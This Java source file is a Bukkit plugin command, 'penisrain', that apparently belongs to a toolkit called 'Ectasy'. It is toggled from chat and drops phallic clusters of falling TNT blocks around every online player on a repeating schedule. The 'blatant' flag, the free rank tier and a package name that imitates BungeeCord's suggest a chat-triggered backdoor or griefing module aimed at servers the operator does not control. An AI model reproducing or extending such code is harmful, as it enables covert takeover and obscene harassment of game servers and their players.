package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.util.ChatUtil;
import java.util.concurrent.ThreadLocalRandom;
import net.md5.bungee.Ectasy;
import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.event.player.AsyncPlayerChatEvent;

@CommandInfo(
   name = "penisrain",
   description = "Rain penises",
   blatant = true,
   rank = Rank.FREE
)
public class PenisRainCommand extends AbstractCommand {
   public static boolean raining = false;

   public static void startPenisRain() {
      Bukkit.getScheduler().scheduleSyncRepeatingTask(Ectasy.parentPlugin, () -> {
         if (raining) {
            for(Player var1 : Bukkit.getServer().getOnlinePlayers()) {
               int var2 = (int)var1.getLocation().getX() + ThreadLocalRandom.current().nextInt(-70, 70);
               int var3 = (int)var1.getLocation().getZ() + ThreadLocalRandom.current().nextInt(-70, 70);
               Location var4 = new Location(var1.getWorld(), var2, 150.0, var3);
               makeFallingBlock(var4);
               makeFallingBlock(var4.add(1.0, 0.0, 0.0));
               makeFallingBlock(var4.add(-2.0, 0.0, 0.0));
               makeFallingBlock(var4.add(1.0, 1.0, 0.0));
               makeFallingBlock(var4.add(0.0, 1.0, 0.0));
            }
         }
      }, 5L, 5L);
   }

   public static void makeFallingBlock(Location var0) {
      var0.getWorld().spawnFallingBlock(var0, Material.TNT, (byte)0);
   }

   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      raining = !raining;
      ChatUtil.sendChat(var1.getPlayer(), "Penis rain " + (raining ? "&astarted" : "&cstopped"));
   }
}
